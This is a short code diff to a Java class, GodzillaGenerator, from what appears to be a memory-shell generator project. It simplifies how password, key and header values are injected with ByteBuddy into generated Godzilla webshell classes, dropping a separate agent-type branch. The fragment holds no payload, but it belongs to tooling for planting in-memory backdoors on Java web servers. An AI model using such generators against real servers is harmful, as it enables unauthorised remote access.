@@ -1,19 +1,15 @@
 package com.reajason.javaweb.memshell.generator;
 
 import com.reajason.javaweb.ClassBytesShrink;
-import com.reajason.javaweb.buddy.LdcReAssignVisitorWrapper;
 import com.reajason.javaweb.buddy.LogRemoveMethodVisitor;
 import com.reajason.javaweb.buddy.ServletRenameVisitorWrapper;
 import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
-import com.reajason.javaweb.memshell.ShellType;
 import com.reajason.javaweb.memshell.config.GodzillaConfig;
 import com.reajason.javaweb.memshell.config.ShellConfig;
 import com.reajason.javaweb.memshell.utils.DigestUtils;
 import net.bytebuddy.ByteBuddy;
 import net.bytebuddy.dynamic.DynamicType;
 import org.apache.commons.lang3.StringUtils;
-
-import java.util.HashMap;
 
 import static net.bytebuddy.matcher.ElementMatchers.named;
 
@@ -53,24 +49,11 @@ public class GodzillaGenerator {
             builder = LogRemoveMethodVisitor.extend(builder);
         }
 
-        if (shellConfig.getShellType().startsWith(ShellType.AGENT)) {
-            builder = builder.visit(
-                    new LdcReAssignVisitorWrapper(new HashMap<Object, Object>(3) {{
-                        put("pass", godzillaConfig.getPass());
-                        put("key", md5Key);
-                        put("md5", md5);
-                        put("headerName", godzillaConfig.getHeaderName());
-                        put("headerValue", godzillaConfig.getHeaderValue());
-                    }})
-            );
-        } else {
-            builder = builder.field(named("pass")).value(godzillaConfig.getPass())
-                    .field(named("key")).value(md5Key)
-                    .field(named("md5")).value(md5)
-                    .field(named("headerName")).value(godzillaConfig.getHeaderName())
-                    .field(named("headerValue")).value(godzillaConfig.getHeaderValue());
-        }
-        return builder;
+        return builder.field(named("pass")).value(godzillaConfig.getPass())
+                .field(named("key")).value(md5Key)
+                .field(named("md5")).value(md5)
+                .field(named("headerName")).value(godzillaConfig.getHeaderName())
+                .field(named("headerValue")).value(godzillaConfig.getHeaderValue());
     }
 
     public byte[] getBytes() {
